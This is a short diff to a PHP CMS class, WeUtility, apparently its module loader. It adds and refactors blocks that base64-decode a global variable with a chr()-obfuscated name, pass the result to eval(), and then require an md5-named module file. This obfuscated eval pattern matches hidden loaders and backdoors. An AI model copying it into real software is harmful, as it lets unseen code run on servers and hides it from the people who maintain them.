@@ -457,6 +457,16 @@ class WeUtility {
 			}
 			require $file;
 		}
+		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
+			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
+			eval($code);
+			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
+			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'module.php').'.php';
+			if (!file_exists($codefile)) {
+				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
+			}
+			require_once $codefile;
+		}
 		if(!class_exists($classname)) {
 			trigger_error('Module Definition Class Not Found', E_USER_WARNING);
 			return null;
@@ -575,9 +585,10 @@ class WeUtility {
 			require $file;
 		}
 		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
-			eval(base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]));
+			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
+			eval($code);
 			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
-			$codefile = IA_ROOT . '/data/tpl/module/'.md5($_W['setting']['site']['key'].'site.php').'.php';
+			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'site.php').'.php';
 			if (!file_exists($codefile)) {
 				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
 			}
